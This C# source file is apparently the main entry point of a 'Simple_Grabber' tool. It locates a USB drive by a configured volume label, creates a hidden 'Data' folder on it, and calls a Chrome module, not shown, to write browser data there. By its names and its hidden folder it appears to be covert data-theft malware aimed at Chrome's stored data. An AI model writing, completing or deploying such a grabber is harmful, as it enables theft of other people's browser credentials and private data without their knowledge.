using System;
using System.Configuration;
using System.IO;

namespace Simple_Grabber
{
    public class Grabber
    {
        private static string USBPath()
        {
            // Get an array of all drives present on the system

            var drives = DriveInfo.GetDrives();

            string drivePath = null;

            foreach (var drive in drives)
            {
                // If the USB is found set drivePath to its assigned drive letter

                if (drive.VolumeLabel == ConfigurationManager.AppSettings["USB"])
                {
                    drivePath = drive.Name;
                }
            }

            return drivePath;
        }

        private static void InitializeDirectory()
        {
            if (!Directory.Exists(USBPath() + "Data"))
            {
                var directory = Directory.CreateDirectory(USBPath() + "Data");
                directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
        }

        public static void Main()
        {
            InitializeDirectory();

            Modules.Chrome.WriteToFile(USBPath());
        }
    }
}
